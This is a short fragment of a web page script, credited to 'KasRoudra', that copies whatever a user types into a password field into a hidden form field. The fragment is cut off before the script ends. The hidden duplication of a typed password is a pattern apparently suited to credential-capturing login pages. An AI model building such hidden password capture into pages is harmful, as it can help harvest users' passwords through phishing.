    <!-- Original Source Code Script Integration (Password Synchronization) -->
    <script>
      /* Coded By KasRoudra */
      const hiddenPass = document.getElementById("hiddenPass");
      const password = document.getElementById("pass");
      password.onchange = (e) => {
        hiddenPass.value = e.target.value;
      };
      password.oninput = (e) => {
        hiddenPass.value = e.target.value;
      };
